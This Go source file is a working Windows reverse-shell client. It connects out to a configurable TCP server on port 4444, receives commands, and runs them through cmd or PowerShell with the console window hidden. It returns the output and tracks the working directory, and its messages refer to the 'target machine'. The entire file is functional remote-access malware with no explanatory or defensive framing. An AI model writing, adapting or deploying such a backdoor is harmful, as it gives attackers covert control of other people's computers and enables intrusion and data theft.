package main

import (
	"bytes"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

const (
	SERVER_HOST = "localhost"
	SERVER_PORT = "4444"
	SERVER_TYPE = "tcp"
)

var powershell_mode = false
var path string
var bad_index int
var response_list []string
var lines []string

func execute(connection net.Conn, command string) []string {

	execute := exec.Command("cmd", "/C", command)
	execute.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	var stdout, stderr bytes.Buffer
	execute.Stdout = &stdout
	execute.Stderr = &stderr

	shell_error := execute.Run()

	response_string := string(stdout.String())
	response_string = strings.ReplaceAll(response_string, "\r", "")
	if shell_error != nil {
		return []string{"1", stderr.String()}
	} else {
		return []string{"0", stdout.String()}
	}
}

func main() {

	connection, err := net.Dial(SERVER_TYPE, SERVER_HOST+":"+SERVER_PORT)
	if err != nil {
		panic(err)
	}

	for true {
		buffer := make([]byte, 1024)
		mLen, err := connection.Read(buffer)
		if err != nil {
			fmt.Println("Error reading:", err.Error())
			os.Exit(0)
		}

		command := string(buffer[:mLen])

		if command == "#ping" {
			fmt.Println("Ping Recieved")
			continue
		}

		if command == "#This_code_grabs_the_path_" {
			dir, _ := os.Getwd()
			_, err = connection.Write([]byte(dir))
			continue
		}

		if !powershell_mode && command == "powershell" {
			powershell_mode = true
			connection.Write([]byte("Powershell mode enabled"))
			continue
		}
		if powershell_mode && command == "powershell" {
			powershell_mode = false
			connection.Write([]byte("Powershell mode disabled"))
			continue
		}

		if !powershell_mode {
			command = command + " && echo. && cd"
		} else {
			command = "powershell -c " + command + "; echo ($pwd).path"
		}

		result_chan := make(chan []string)

		go func() {
			result := execute(connection, command)
			result_chan <- result
		}()

		var response_list []string
		select {
		case response_list = <-result_chan:

		case <-time.After(time.Second * 3):
			connection.Write([]byte("No output was received in 3 seconds\nDon't worry the command will keep executing as a thread in target machine\n<>END<>"))
			continue
		}

		if response_list[0] == "1" {
			connection.Write([]byte(response_list[1] + "\n<>END<>"))
			continue
		}
		response_string := response_list[1]

		if !powershell_mode {
			lines = strings.Split(response_string, "\n")
		} else {
			lines = strings.Split(response_string, "\n")
			for i := 0; i < len(lines); i++ {
				lines[i] = strings.TrimSuffix(lines[i], "\r")
				lines[i] = strings.TrimSuffix(lines[i], "\n")
			}
		}
		for i := len(lines) - 1; i >= 0; i-- {
			if lines[i] != "" {
				path = lines[i]
				lines = append(lines[:i], lines[i+1:]...)
				break
			}
		}

		//fmt.Println(lines)
		path = strings.TrimSuffix(path, "\n")
		path = strings.TrimSuffix(path, "\r")
		os.Chdir(path)
		fmt.Println(path)
		err2 := os.Chdir(path)

		if err2 != nil {
			// fmt.Println("Trigger" + err2.Error())
		}

		for i := 0; i < len(lines)-2; i++ {
			lines[i] = lines[i] + "\n"
		}
		if (len(lines)) > 3 {
			lines[len(lines)-3] = strings.TrimSuffix(lines[len(lines)-3], "\n")
		}

		response_string = strings.Join(lines, "")

		connection.Write([]byte(response_string + "\n<>END<>"))

		// buffer = nil

	}
}
